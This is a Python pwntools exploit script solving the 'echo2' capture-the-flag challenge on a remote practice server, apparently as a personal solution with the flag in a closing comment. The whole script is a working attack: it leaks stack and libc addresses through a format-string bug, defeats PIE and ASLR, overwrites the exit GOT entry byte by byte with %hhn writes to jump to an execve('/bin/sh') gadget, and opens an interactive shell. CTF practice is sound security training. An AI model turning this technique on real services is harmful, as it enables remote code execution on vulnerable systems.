from pwn import *

context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'amd64', os = 'linux', log_level = 'debug')
path = '/home/zander/Desktop/ctf/echo2'

# 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
# 0x7ffff7a2d740 ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)

def exec_fmt(payload):
    p = process(path)
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info

offset = FmtStr(exec_fmt).offset # 6
echo_ret_offset = offset + 280 / 8
__libc_start_main_ret_offset = echo_ret_offset + 2

elf = ELF(path)
exit_got_addr = elf.got['exit']

magic_addr = 0x0f0897
# .text:00000000000F0897                 mov     rax, cs:environ_ptr_0
# .text:00000000000F089E                 lea     rsi, [rsp+1D8h+var_168]
# .text:00000000000F08A3                 lea     rdi, aBinSh     ; "/bin/sh"
# .text:00000000000F08AA                 mov     rdx, [rax]
# .text:00000000000F08AD                 call    execve

# p = process(path)
p = remote('hackme.inndy.tw', 7712)

payload_leak = '%%%d$p' % echo_ret_offset + '.%%%d$p' %  __libc_start_main_ret_offset
p.sendline(payload_leak)
res = p.recv()
[echo_ret, __libc_start_main_ret] = res.split('.')
echo_ret = int(echo_ret, 16)
__libc_start_main_ret = int(__libc_start_main_ret, 16)

# vmmap
libc_base = __libc_start_main_ret - (0x7ffff7a2d830 - 0x00007ffff7a0d000)
module_base = echo_ret - (0x555555554a03 - 0x0000555555554000)
exit_got_addr += module_base # 0x556b96450048
magic_addr += libc_base # 0x7f5326d3b4e6

# m1 = str(int(hex(magic_addr)[-4:], 16) - 19) # ? -19
# m2 = str(int(hex(magic_addr)[-8:-4], 16) - 19)
# m3 = str(int(hex(magic_addr)[-12:-8], 16) - 19)

for i in range(0, 6):
    payload = '%' + str(ord(p64(magic_addr)[i])) + 'c%8$hhn'
    payload += 'a' * (16 - len(payload))
    payload += p64(exit_got_addr + i)
    p.sendline(payload)

p.sendline('exit')
p.interactive()
p.close()

# FLAG{do you know PIE? %9$s or the ASLR? %9c$8$hhn}